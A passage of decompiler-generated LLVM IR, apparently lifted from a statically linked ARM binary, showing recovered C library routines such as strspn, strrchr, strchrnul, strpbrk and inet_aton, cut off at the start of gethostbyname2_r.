dec_label_pc_1720c:                               ; preds = %dec_label_pc_171f8, %dec_label_pc_17204, %entry
  %v0_1729413 = phi i32 [ %v2_171e4, %entry ], [ %v1_171ec, %dec_label_pc_171f8 ], [ %v0_171ec, %dec_label_pc_17204 ]
  %v0_172809 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_171f8 ], [ %v0_171f8, %dec_label_pc_17204 ]
  %v4_1720c = mul nuw nsw i32 %v1_171e0, 256
  %v5_1720c = or i32 %v4_1720c, %v1_171e0
  %v4_17210 = mul i32 %v5_1720c, 65536
  %v5_17210 = or i32 %v4_17210, %v5_1720c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_172809, 3
  br i1 %tmp, label %dec_label_pc_17218, label %dec_label_pc_172a0

dec_label_pc_17218:                               ; preds = %dec_label_pc_1720c, %dec_label_pc_17280.backedge
  %v0_1723440 = phi i32 [ %v1_17234, %dec_label_pc_17280.backedge ], [ %v0_172809, %dec_label_pc_1720c ]
  %v0_1721839 = phi i32 [ %v1_17218, %dec_label_pc_17280.backedge ], [ %v0_1729413, %dec_label_pc_1720c ]
  %v1_17218 = add i32 %v0_1721839, -4
  %v2_17218 = inttoptr i32 %v1_17218 to i32*
  %v3_17218 = load i32, i32* %v2_17218, align 4
  %v2_1721c = xor i32 %v3_17218, %v5_17210
  %v2_17220 = add i32 %v2_1721c, 2130640639
  store i32 %v2_17220, i32* @ip, align 4
  %v1_17224 = sub i32 -1, %v2_1721c
  %v2_17228 = xor i32 %v2_17220, %v1_17224
  %v2_1722c = and i32 %v2_17228, -2130640640
  %v2_17230 = icmp eq i32 %v2_1722c, 0
  %v1_17234 = add i32 %v0_1723440, -4
  br i1 %v2_17230, label %dec_label_pc_17280.backedge, label %dec_label_pc_1723c

dec_label_pc_17280.backedge:                      ; preds = %dec_label_pc_17218, %dec_label_pc_17274
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_17234, 3
  br i1 %tmp46, label %dec_label_pc_17218, label %dec_label_pc_172a0

dec_label_pc_1723c:                               ; preds = %dec_label_pc_17218
  %v1_1723c = add i32 %v0_1721839, -1
  %v2_1723c = inttoptr i32 %v1_1723c to i8*
  %v3_1723c = load i8, i8* %v2_1723c, align 1
  %v4_1723c = zext i8 %v3_1723c to i32
  %v9_17240 = icmp eq i32 %v4_1723c, %v1_171e0
  br i1 %v9_17240, label %dec_label_pc_1726c, label %dec_label_pc_1724c

dec_label_pc_1724c:                               ; preds = %dec_label_pc_1723c
  %v1_1724c = add i32 %v0_1721839, -2
  %v2_1724c = inttoptr i32 %v1_1724c to i8*
  %v3_1724c = load i8, i8* %v2_1724c, align 1
  %v4_1724c = zext i8 %v3_1724c to i32
  %v9_17250 = icmp eq i32 %v4_1724c, %v1_171e0
  br i1 %v9_17250, label %dec_label_pc_1726c, label %dec_label_pc_1725c

dec_label_pc_1725c:                               ; preds = %dec_label_pc_1724c
  %v1_1725c = add i32 %v0_1721839, -3
  %v2_1725c = inttoptr i32 %v1_1725c to i8*
  %v3_1725c = load i8, i8* %v2_1725c, align 1
  %v4_1725c = zext i8 %v3_1725c to i32
  %v9_17260 = icmp eq i32 %v4_1725c, %v1_171e0
  br i1 %v9_17260, label %dec_label_pc_1726c, label %dec_label_pc_17274

dec_label_pc_1726c:                               ; preds = %dec_label_pc_1725c, %dec_label_pc_1724c, %dec_label_pc_1723c
  %v0_1726c = phi i32 [ %v1_1725c, %dec_label_pc_1725c ], [ %v1_1724c, %dec_label_pc_1724c ], [ %v1_1723c, %dec_label_pc_1723c ]
  br label %dec_label_pc_172ac

dec_label_pc_17274:                               ; preds = %dec_label_pc_1725c
  %v1_17274 = inttoptr i32 %v1_17218 to i8*
  %v2_17274 = load i8, i8* %v1_17274, align 1
  %v3_17274 = zext i8 %v2_17274 to i32
  %v9_17278 = icmp eq i32 %v3_17274, %v1_171e0
  br i1 %v9_17278, label %dec_label_pc_172ac, label %dec_label_pc_17280.backedge

dec_label_pc_17294:                               ; preds = %dec_label_pc_172a0
  %v1_172a0 = add i32 %v0_172a0, -1
  %v1_17294 = add i32 %v0_17294, -1
  %v2_17294 = inttoptr i32 %v1_17294 to i8*
  %v3_17294 = load i8, i8* %v2_17294, align 1
  %v4_17294 = zext i8 %v3_17294 to i32
  %v9_17298 = icmp eq i32 %v4_17294, %v1_171e0
  br i1 %v9_17298, label %dec_label_pc_172ac, label %dec_label_pc_172a0

dec_label_pc_172a0:                               ; preds = %dec_label_pc_1720c, %dec_label_pc_17280.backedge, %dec_label_pc_17294
  %v0_17294 = phi i32 [ %v1_17294, %dec_label_pc_17294 ], [ %v0_1729413, %dec_label_pc_1720c ], [ %v1_17218, %dec_label_pc_17280.backedge ]
  %v0_172a0 = phi i32 [ %v1_172a0, %dec_label_pc_17294 ], [ %v0_172809, %dec_label_pc_1720c ], [ %v1_17234, %dec_label_pc_17280.backedge ]
  %v2_172a0 = icmp eq i32 %v0_172a0, 0
  br i1 %v2_172a0, label %dec_label_pc_172a8, label %dec_label_pc_17294

dec_label_pc_172a8:                               ; preds = %dec_label_pc_172a0
  br label %dec_label_pc_172ac

dec_label_pc_172ac:                               ; preds = %dec_label_pc_171ec, %dec_label_pc_17274, %dec_label_pc_17294, %dec_label_pc_1726c, %dec_label_pc_172a8
  %v1_172b0 = phi i32 [ %v0_1726c, %dec_label_pc_1726c ], [ 0, %dec_label_pc_172a8 ], [ %v1_17294, %dec_label_pc_17294 ], [ %v1_17218, %dec_label_pc_17274 ], [ %v1_171ec, %dec_label_pc_171ec ]
  ret i32 %v1_172b0

; uselistorder directives
  uselistorder i32 %v0_172a0, { 1, 0 }
  uselistorder i32 %v1_17234, { 1, 0, 2 }
  uselistorder i32 %v1_17218, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_1721839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1720c, { 1, 0 }
  uselistorder i32 %v0_172809, { 1, 2, 0 }
  uselistorder i32 %v0_171ec, { 1, 0, 2 }
  uselistorder i32 %v2_171e4, { 1, 0 }
  uselistorder i32 %v1_171e0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_172ac, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_172a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17280.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17218, { 1, 0 }
  uselistorder label %dec_label_pc_1720c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17204, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_172ec2 = load i32, i32* @r0, align 4
  %v1_172ec3 = inttoptr i32 %v0_172ec2 to i8*
  %v2_172ec4 = load i8, i8* %v1_172ec3, align 1
  %v3_172ec5 = zext i8 %v2_172ec4 to i32
  store i32 %v3_172ec5, i32* @ip, align 4
  %v2_172f06 = icmp eq i8 %v2_172ec4, 0
  br i1 %v2_172f06, label %dec_label_pc_172fc, label %dec_label_pc_172d0.preheader

dec_label_pc_172c8:                               ; preds = %dec_label_pc_172d0
  %v3_172d0 = zext i8 %v2_172d0 to i32
  %v1_172d8 = add i32 %v0_172d8, 1
  %v9_172c8 = icmp eq i32 %v0_172c810, %v3_172d0
  br i1 %v9_172c8, label %dec_label_pc_172e4, label %dec_label_pc_172d0

dec_label_pc_172d0:                               ; preds = %dec_label_pc_172d0.preheader, %dec_label_pc_172c8
  %v0_172d8 = phi i32 [ %tmp, %dec_label_pc_172d0.preheader ], [ %v1_172d8, %dec_label_pc_172c8 ]
  %v1_172d0 = inttoptr i32 %v0_172d8 to i8*
  %v2_172d0 = load i8, i8* %v1_172d0, align 1
  %v2_172d4 = icmp eq i8 %v2_172d0, 0
  br i1 %v2_172d4, label %dec_label_pc_172fc, label %dec_label_pc_172c8

dec_label_pc_172e4:                               ; preds = %dec_label_pc_172c8
  %v1_172e4 = add i32 %v0_172e4, 1
  %v1_172e8 = add i32 %v0_172e8, 1
  %v1_172ec = inttoptr i32 %v1_172e8 to i8*
  %v2_172ec = load i8, i8* %v1_172ec, align 1
  %v3_172ec = zext i8 %v2_172ec to i32
  store i32 %v3_172ec, i32* @ip, align 4
  %v2_172f0 = icmp eq i8 %v2_172ec, 0
  br i1 %v2_172f0, label %dec_label_pc_172fc, label %dec_label_pc_172d0.preheader

dec_label_pc_172d0.preheader:                     ; preds = %entry, %dec_label_pc_172e4
  %v0_172e8 = phi i32 [ %v1_172e8, %dec_label_pc_172e4 ], [ %v0_172ec2, %entry ]
  %v0_172e4 = phi i32 [ %v1_172e4, %dec_label_pc_172e4 ], [ 0, %entry ]
  %v0_172c810 = phi i32 [ %v3_172ec, %dec_label_pc_172e4 ], [ %v3_172ec5, %entry ]
  br label %dec_label_pc_172d0

dec_label_pc_172fc:                               ; preds = %dec_label_pc_172e4, %dec_label_pc_172d0, %entry
  %v0_172fc = phi i32 [ 0, %entry ], [ %v0_172e4, %dec_label_pc_172d0 ], [ %v1_172e4, %dec_label_pc_172e4 ]
  ret i32 %v0_172fc

; uselistorder directives
  uselistorder i32 %v0_172d8, { 1, 0 }
  uselistorder label %dec_label_pc_172d0.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1730c = urem i32 %arg2, 256
  store i32 %v1_1730c, i32* @r4, align 4
  %v2_1730c = icmp eq i32 %v1_1730c, 0
  br i1 %v2_1730c, label %dec_label_pc_17320, label %dec_label_pc_17334.preheader

dec_label_pc_17334.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1733c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_1730c)
  %v2_173405 = icmp eq i32 %v2_1733c3, 0
  br i1 %v2_173405, label %dec_label_pc_17348, label %dec_label_pc_1732c

dec_label_pc_17320:                               ; preds = %entry
  %v2_17324 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1734c

dec_label_pc_1732c:                               ; preds = %dec_label_pc_17334.preheader, %dec_label_pc_1732c
  %v2_1733c6 = phi i32 [ %v2_1733c, %dec_label_pc_1732c ], [ %v2_1733c3, %dec_label_pc_17334.preheader ]
  store i32 %v2_1733c6, i32* @r5, align 4
  %v1_17330 = add i32 %v2_1733c6, 1
  store i32 %v1_17330, i32* @r0, align 4
  %v0_17338 = load i32, i32* @r4, align 4
  %v2_1733c = call i32 @__GI_strchr(i32 %v1_17330, i32 %v0_17338)
  %v2_17340 = icmp eq i32 %v2_1733c, 0
  br i1 %v2_17340, label %dec_label_pc_17348, label %dec_label_pc_1732c

dec_label_pc_17348:                               ; preds = %dec_label_pc_1732c, %dec_label_pc_17334.preheader
  %v0_17348 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1734c

dec_label_pc_1734c:                               ; preds = %dec_label_pc_17320, %dec_label_pc_17348
  %storemerge = phi i32 [ %v2_17324, %dec_label_pc_17320 ], [ %v0_17348, %dec_label_pc_17348 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1733c, { 1, 0 }
  uselistorder i32 %v1_17330, { 1, 0 }
  uselistorder i32 %v1_1730c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1734c, { 1, 0 }
  uselistorder label %dec_label_pc_1732c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_17358 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17368 = call i32 @memcpy()
  %v0_1736c = load i32, i32* @r5, align 4
  %v1_1736c = load i32, i32* @r4, align 4
  %v2_1736c = add i32 %v1_1736c, %v0_1736c
  store i32 %v6_17358, i32* @r5, align 4
  ret i32 %v2_1736c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_17380 = urem i32 %arg1, 256
  %v0_173a02 = load i32, i32* @r0, align 4
  %v1_173a03 = urem i32 %v0_173a02, 4
  %v2_173a04 = icmp eq i32 %v1_173a03, 0
  br i1 %v2_173a04, label %dec_label_pc_173a8, label %dec_label_pc_17388

dec_label_pc_17388:                               ; preds = %entry, %dec_label_pc_1739c
  %v0_1739c = phi i32 [ %v1_1739c, %dec_label_pc_1739c ], [ %v0_173a02, %entry ]
  %v1_17388 = inttoptr i32 %v0_1739c to i8*
  %v2_17388 = load i8, i8* %v1_17388, align 1
  %v3_17388 = zext i8 %v2_17388 to i32
  %v9_1738c = icmp eq i32 %v3_17388, %v1_17380
  br i1 %v9_1738c, label %dec_label_pc_17458, label %dec_label_pc_17394

dec_label_pc_17394:                               ; preds = %dec_label_pc_17388
  %v2_17394 = icmp eq i8 %v2_17388, 0
  br i1 %v2_17394, label %dec_label_pc_17458, label %dec_label_pc_1739c

dec_label_pc_1739c:                               ; preds = %dec_label_pc_17394
  %v1_1739c = add i32 %v0_1739c, 1
  %v1_173a0 = urem i32 %v1_1739c, 4
  %v2_173a0 = icmp eq i32 %v1_173a0, 0
  br i1 %v2_173a0, label %dec_label_pc_173a8, label %dec_label_pc_17388

dec_label_pc_173a8:                               ; preds = %dec_label_pc_1739c, %entry
  %v0_173ac = phi i32 [ %v0_173a02, %entry ], [ %v1_1739c, %dec_label_pc_1739c ]
  %v4_173a8 = mul nuw nsw i32 %v1_17380, 256
  %v5_173a8 = or i32 %v4_173a8, %v1_17380
  %v4_173b0 = mul i32 %v5_173a8, 65536
  %v5_173b0 = or i32 %v4_173b0, %v5_173a8
  br label %dec_label_pc_173b4

dec_label_pc_173b4:                               ; preds = %dec_label_pc_17450, %dec_label_pc_173f0, %dec_label_pc_173a8
  %v0_17418 = phi i32 [ %v0_173ac, %dec_label_pc_173a8 ], [ %v4_173b4, %dec_label_pc_173f0 ], [ %v4_173b4, %dec_label_pc_17450 ]
  %v1_173b4 = inttoptr i32 %v0_17418 to i32*
  %v2_173b4 = load i32, i32* %v1_173b4, align 4
  %v4_173b4 = add i32 %v0_17418, 4
  %v2_173bc = xor i32 %v2_173b4, %v5_173b0
  %v2_173c0 = add i32 %v2_173bc, 2130640639
  store i32 %v2_173c0, i32* @ip, align 4
  %v2_173c8 = add i32 %v2_173b4, 2130640639
  %v1_173cc = sub i32 -1, %v2_173b4
  %v2_173d0 = xor i32 %v2_173c8, %v1_173cc
  %v2_173dc = and i32 %v2_173d0, -2130640640
  %v2_173e4 = icmp eq i32 %v2_173dc, 0
  br i1 %v2_173e4, label %dec_label_pc_173f0, label %dec_label_pc_173f8

dec_label_pc_173f0:                               ; preds = %dec_label_pc_173b4
  %v1_173d8 = sub i32 -1, %v2_173bc
  %v2_173e0 = xor i32 %v2_173c0, %v1_173d8
  %v2_173e8 = and i32 %v2_173e0, -2130640640
  %v2_173f0 = icmp eq i32 %v2_173e8, 0
  br i1 %v2_173f0, label %dec_label_pc_173b4, label %dec_label_pc_173f8

dec_label_pc_173f8:                               ; preds = %dec_label_pc_173b4, %dec_label_pc_173f0
  %v2_173f8 = inttoptr i32 %v0_17418 to i8*
  %v3_173f8 = load i8, i8* %v2_173f8, align 1
  %v4_173f8 = zext i8 %v3_173f8 to i32
  %v9_173fc = icmp eq i32 %v4_173f8, %v1_17380
  br i1 %v9_173fc, label %dec_label_pc_17458, label %dec_label_pc_17408

dec_label_pc_17408:                               ; preds = %dec_label_pc_173f8
  %v2_17408 = icmp eq i8 %v3_173f8, 0
  br i1 %v2_17408, label %dec_label_pc_17458, label %dec_label_pc_17410

dec_label_pc_17410:                               ; preds = %dec_label_pc_17408
  %v1_17410 = add i32 %v0_17418, 1
  %v2_17410 = inttoptr i32 %v1_17410 to i8*
  %v3_17410 = load i8, i8* %v2_17410, align 1
  %v4_17410 = zext i8 %v3_17410 to i32
  %v9_17414 = icmp eq i32 %v4_17410, %v1_17380
  br i1 %v9_17414, label %dec_label_pc_17458, label %dec_label_pc_17420

dec_label_pc_17420:                               ; preds = %dec_label_pc_17410
  %v2_17420 = icmp eq i8 %v3_17410, 0
  br i1 %v2_17420, label %dec_label_pc_17458, label %dec_label_pc_17428

dec_label_pc_17428:                               ; preds = %dec_label_pc_17420
  %v1_17428 = add i32 %v0_17418, 2
  %v2_17428 = inttoptr i32 %v1_17428 to i8*
  %v3_17428 = load i8, i8* %v2_17428, align 1
  %v4_17428 = zext i8 %v3_17428 to i32
  %v9_1742c = icmp eq i32 %v4_17428, %v1_17380
  br i1 %v9_1742c, label %dec_label_pc_17458, label %dec_label_pc_17438

dec_label_pc_17438:                               ; preds = %dec_label_pc_17428
  %v2_17438 = icmp eq i8 %v3_17428, 0
  br i1 %v2_17438, label %dec_label_pc_17458, label %dec_label_pc_17440

dec_label_pc_17440:                               ; preds = %dec_label_pc_17438
  %v1_17440 = add i32 %v0_17418, 3
  %v2_17440 = inttoptr i32 %v1_17440 to i8*
  %v3_17440 = load i8, i8* %v2_17440, align 1
  %v4_17440 = zext i8 %v3_17440 to i32
  %v9_17444 = icmp eq i32 %v4_17440, %v1_17380
  br i1 %v9_17444, label %dec_label_pc_17458, label %dec_label_pc_17450

dec_label_pc_17450:                               ; preds = %dec_label_pc_17440
  %v2_17450 = icmp eq i8 %v3_17440, 0
  br i1 %v2_17450, label %dec_label_pc_17458, label %dec_label_pc_173b4

dec_label_pc_17458:                               ; preds = %dec_label_pc_17394, %dec_label_pc_17388, %dec_label_pc_17450, %dec_label_pc_17440, %dec_label_pc_17438, %dec_label_pc_17428, %dec_label_pc_17420, %dec_label_pc_17410, %dec_label_pc_17408, %dec_label_pc_173f8
  %v1_1745c = phi i32 [ %v1_17440, %dec_label_pc_17450 ], [ %v1_17440, %dec_label_pc_17440 ], [ %v1_17428, %dec_label_pc_17438 ], [ %v1_17428, %dec_label_pc_17428 ], [ %v1_17410, %dec_label_pc_17420 ], [ %v1_17410, %dec_label_pc_17410 ], [ %v0_17418, %dec_label_pc_17408 ], [ %v0_17418, %dec_label_pc_173f8 ], [ %v0_1739c, %dec_label_pc_17388 ], [ %v0_1739c, %dec_label_pc_17394 ]
  ret i32 %v1_1745c

; uselistorder directives
  uselistorder i32 %v4_173b4, { 1, 0 }
  uselistorder i32 %v2_173b4, { 0, 2, 1 }
  uselistorder i32 %v0_17418, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_173a8, { 1, 0 }
  uselistorder i32 %v1_1739c, { 1, 0, 2 }
  uselistorder i32 %v0_173a02, { 2, 1, 0 }
  uselistorder i32 %v1_17380, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_17458, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_173f8, { 1, 0 }
  uselistorder label %dec_label_pc_17388, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17494

dec_label_pc_17470:                               ; preds = %dec_label_pc_17480
  %v3_17480 = zext i8 %v2_17480 to i32
  %v1_17488 = add i32 %v0_17488, 1
  %v1_17470 = load i32, i32* %r0.global-to-local, align 4
  %v9_17470 = icmp eq i32 %v3_17480, %v1_17470
  br i1 %v9_17470, label %dec_label_pc_17478, label %dec_label_pc_17480

dec_label_pc_17478:                               ; preds = %dec_label_pc_17470
  %v0_17478 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17478, i32* %r0.global-to-local, align 4
  ret i32 %v0_17478

dec_label_pc_17480:                               ; preds = %dec_label_pc_17470, %dec_label_pc_17494
  %v0_17488 = phi i32 [ %v1_17488, %dec_label_pc_17470 ], [ %arg2, %dec_label_pc_17494 ]
  %v1_17480 = inttoptr i32 %v0_17488 to i8*
  %v2_17480 = load i8, i8* %v1_17480, align 1
  %v2_17484 = icmp eq i8 %v2_17480, 0
  br i1 %v2_17484, label %dec_label_pc_17490, label %dec_label_pc_17470

dec_label_pc_17490:                               ; preds = %dec_label_pc_17480
  %v0_17490 = load i32, i32* %r2.global-to-local, align 4
  %v1_17490 = add i32 %v0_17490, 1
  br label %dec_label_pc_17494

dec_label_pc_17494:                               ; preds = %entry, %dec_label_pc_17490
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_17490, %dec_label_pc_17490 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_17494 = inttoptr i32 %storemerge to i8*
  %v2_17494 = load i8, i8* %v1_17494, align 1
  %v3_17494 = zext i8 %v2_17494 to i32
  store i32 %v3_17494, i32* %r0.global-to-local, align 4
  %v2_17498 = icmp eq i8 %v2_17494, 0
  %v0_1749c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17498, i32 %v0_1749c)
  br label %dec_label_pc_17480

; uselistorder directives
  uselistorder i32 %v0_17488, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_17494, { 1, 0 }
  uselistorder label %dec_label_pc_17480, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_174a8 = load i32, i32* @r4, align 4
  store i32 %v3_174a8, i32* %stack_var_-28, align 4
  %v0_174b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_174b0 = icmp eq i32 %v0_174b0, 0
  br i1 %v2_174b0, label %dec_label_pc_1758c, label %dec_label_pc_174c0

dec_label_pc_174c0:                               ; preds = %entry
  br label %dec_label_pc_174d8

dec_label_pc_174d8:                               ; preds = %dec_label_pc_174c0, %dec_label_pc_17550
  %v1_17550 = phi i32 [ 0, %dec_label_pc_174c0 ], [ %v5_17550, %dec_label_pc_17550 ]
  %v0_17554 = phi i32 [ 1, %dec_label_pc_174c0 ], [ %v1_17554, %dec_label_pc_17550 ]
  %v0_174d8 = phi i32 [ %v0_174b0, %dec_label_pc_174c0 ], [ %v0_174d812, %dec_label_pc_17550 ]
  %v1_174d8 = inttoptr i32 %v0_174d8 to i8*
  %v2_174d8 = load i8, i8* %v1_174d8, align 1
  %v3_174d8 = zext i8 %v2_174d8 to i32
  %v4_174dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 524) to i32*), align 4
  %v2_174e0 = mul nuw nsw i32 %v3_174d8, 2
  %v2_174e4 = add i32 %v2_174e0, %v4_174dc
  %v3_174e4 = inttoptr i32 %v2_174e4 to i16*
  %v4_174e4 = load i16, i16* %v3_174e4, align 2
  %v1_174e8 = and i16 %v4_174e4, 8
  %v2_174e8 = icmp eq i16 %v1_174e8, 0
  br i1 %v2_174e8, label %dec_label_pc_1758c, label %dec_label_pc_174f0

dec_label_pc_174f0:                               ; preds = %dec_label_pc_174d8
  br label %dec_label_pc_17510

dec_label_pc_174f8:                               ; preds = %dec_label_pc_17510
  %v2_174f8 = mul i32 %v0_17550, 10
  %v1_174fc = add i32 %v2_174f8, -48
  %v2_17500 = add i32 %v3_17510, %v1_174fc
  %v8_17508 = icmp sgt i32 %v2_17500, 255
  br i1 %v8_17508, label %dec_label_pc_1758c, label %dec_label_pc_1750c

dec_label_pc_1750c:                               ; preds = %dec_label_pc_174f8
  %v1_1750c = add i32 %v0_17540, 1
  store i32 %v1_1750c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17510

dec_label_pc_17510:                               ; preds = %dec_label_pc_174f0, %dec_label_pc_1750c
  %v0_17550 = phi i32 [ 0, %dec_label_pc_174f0 ], [ %v2_17500, %dec_label_pc_1750c ]
  %v0_17540 = phi i32 [ %v0_174d8, %dec_label_pc_174f0 ], [ %v1_1750c, %dec_label_pc_1750c ]
  %v1_17510 = inttoptr i32 %v0_17540 to i8*
  %v2_17510 = load i8, i8* %v1_17510, align 1
  %v3_17510 = zext i8 %v2_17510 to i32
  %v2_17514 = mul nuw nsw i32 %v3_17510, 2
  %v2_17518 = add i32 %v2_17514, %v4_174dc
  %v3_17518 = inttoptr i32 %v2_17518 to i16*
  %v4_17518 = load i16, i16* %v3_17518, align 2
  %v6_17518 = zext i16 %v4_17518 to i32
  %v1_1751c = and i32 %v6_17518, 8
  %v2_1751c = icmp eq i32 %v1_1751c, 0
  br i1 %v2_1751c, label %dec_label_pc_17524, label %dec_label_pc_174f8

dec_label_pc_17524:                               ; preds = %dec_label_pc_17510
  %v7_17524 = icmp eq i32 %v0_17554, 4
  br i1 %v7_17524, label %dec_label_pc_1753c, label %dec_label_pc_1752c

dec_label_pc_1752c:                               ; preds = %dec_label_pc_17524
  %v7_1752c = icmp eq i8 %v2_17510, 46
  br i1 %v7_1752c, label %dec_label_pc_17534, label %dec_label_pc_1758c

dec_label_pc_17534:                               ; preds = %dec_label_pc_1752c
  %v1_17534 = add i32 %v0_17540, 1
  store i32 %v1_17534, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17550

dec_label_pc_1753c:                               ; preds = %dec_label_pc_17524
  %v2_1753c = icmp eq i8 %v2_17510, 0
  %v1_17540 = add i32 %v0_17540, 1
  store i32 %v1_17540, i32* %r0.global-to-local, align 4
  br i1 %v2_1753c, label %dec_label_pc_17550, label %dec_label_pc_17548

dec_label_pc_17548:                               ; preds = %dec_label_pc_1753c
  %v1_17548 = and i32 %v6_17518, 32
  %v2_17548 = icmp eq i32 %v1_17548, 0
  br i1 %v2_17548, label %dec_label_pc_1758c, label %dec_label_pc_17550

dec_label_pc_17550:                               ; preds = %dec_label_pc_17548, %dec_label_pc_1753c, %dec_label_pc_17534
  %v0_174d812 = phi i32 [ %v1_17540, %dec_label_pc_17548 ], [ %v1_17540, %dec_label_pc_1753c ], [ %v1_17534, %dec_label_pc_17534 ]
  %v4_17550 = mul i32 %v1_17550, 256
  %v5_17550 = or i32 %v0_17550, %v4_17550
  %v1_17554 = add nuw nsw i32 %v0_17554, 1
  %v7_1755c = icmp slt i32 %v1_17554, 5
  br i1 %v7_1755c, label %dec_label_pc_174d8, label %dec_label_pc_17560

dec_label_pc_17560:                               ; preds = %dec_label_pc_17550
  %v2_17560 = icmp eq i32 %arg2, 0
  br i1 %v2_17560, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_17560
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17590

bb:                                               ; preds = %dec_label_pc_17560
  %v4_17564 = udiv i32 %v5_17550, 16777216
  %v2_17568 = udiv i32 %v5_17550, 256
  %v5_1756c = and i32 %v2_17568, 65280
  %v2_17570 = and i32 %v5_17550, 65280
  %v5_17574 = mul nuw nsw i32 %v2_17570, 256
  %v5_17578 = mul i32 %v0_17550, 16777216
  %v6_1756c = or i32 %v4_17564, %v5_17578
  %v6_17574 = or i32 %v6_1756c, %v5_1756c
  %v6_17578 = or i32 %v6_17574, %v5_17574
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17584 = inttoptr i32 %arg2 to i32*
  store i32 %v6_17578, i32* %v3_17584, align 4
  %v2_17590.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17594.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17590

dec_label_pc_1758c:                               ; preds = %dec_label_pc_1752c, %dec_label_pc_17548, %dec_label_pc_174d8, %dec_label_pc_174f8, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17590

dec_label_pc_17590:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_1758c
  %v1_17594 = phi i32 [ %v1_17594.pre, %bb ], [ 0, %dec_label_pc_1758c ], [ 1, %.thread7.thread ]
  %v2_17590 = phi i32 [ %v2_17590.pre, %bb ], [ %v3_174a8, %dec_label_pc_1758c ], [ %v3_174a8, %.thread7.thread ]
  store i32 %v2_17590, i32* @r4, align 4
  ret i32 %v1_17594

; uselistorder directives
  uselistorder i32 %v1_17554, { 1, 0 }
  uselistorder i32 %v5_17550, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17540, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_17590, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1758c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17510, { 1, 0 }
  uselistorder label %dec_label_pc_174d8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
